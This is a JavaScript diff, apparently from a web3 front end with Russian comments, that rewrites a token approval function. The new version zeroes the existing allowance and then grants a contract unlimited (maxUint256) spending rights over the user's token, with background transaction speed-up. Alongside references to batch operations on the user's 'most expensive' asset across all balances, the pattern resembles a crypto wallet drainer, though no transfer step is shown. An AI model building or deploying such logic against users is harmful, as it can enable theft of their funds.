@@ -616,33 +616,65 @@ const getTokenPrice = async (symbol) => {
 }
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
-  const checksumTokenAddress = getAddress(tokenAddress)
-  const checksumContractAddress = getAddress(contractAddress)
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
+
+  const checksumTokenAddress = getAddress(tokenAddress);
+  const checksumContractAddress = getAddress(contractAddress);
+
   try {
+    // Проверяем текущий allowance
+    const currentAllowance = await getTokenAllowance(
+      wagmiConfig,
+      wagmiConfig.account.address, // Текущий адрес пользователя
+      checksumTokenAddress,
+      checksumContractAddress,
+      chainId
+    );
+
+    // Если allowance уже maxUint256, пропускаем approve
+    if (currentAllowance >= maxUint256) {
+      console.log(`Allowance for ${checksumTokenAddress} is already max, skipping approve`);
+      return null; // Возвращаем null, чтобы указать, что approve не нужен
+    }
+
+    // Шаг 1: Обнуляем allowance (approve(spender, 0))
+    if (currentAllowance > 0) {
+      console.log(`Zeroing allowance for ${checksumTokenAddress} on chain ${chainId}`);
+      const zeroTxHash = await writeContract(wagmiConfig, {
+        address: checksumTokenAddress,
+        abi: erc20Abi,
+        functionName: 'approve',
+        args: [checksumContractAddress, 0],
+        chainId,
+      });
+      console.log(`Zero allowance transaction sent: ${zeroTxHash}`);
+      await monitorAndSpeedUpTransaction(zeroTxHash, chainId, wagmiConfig);
+    }
+
+    // Шаг 2: Устанавливаем новый allowance
+    console.log(`Approving ${checksumTokenAddress} for ${checksumContractAddress} on chain ${chainId}`);
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
-      chainId
-    })
-    console.log(`Approve transaction sent: ${txHash}`)
-    
+      chainId,
+    });
+    console.log(`Approve transaction sent: ${txHash}`);
+
     // Запускаем мониторинг транзакции в фоне
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error)
-    })
-    
-    return txHash
-  } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`)
-    throw error
-  }
-}
+      console.error(`Error monitoring transaction ${txHash}:`, error);
+    });
 
+    return txHash;
+  } catch (error) {
+    store.errors.push(`Approve token failed: ${error.message}`);
+    throw error;
+  }
+};
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
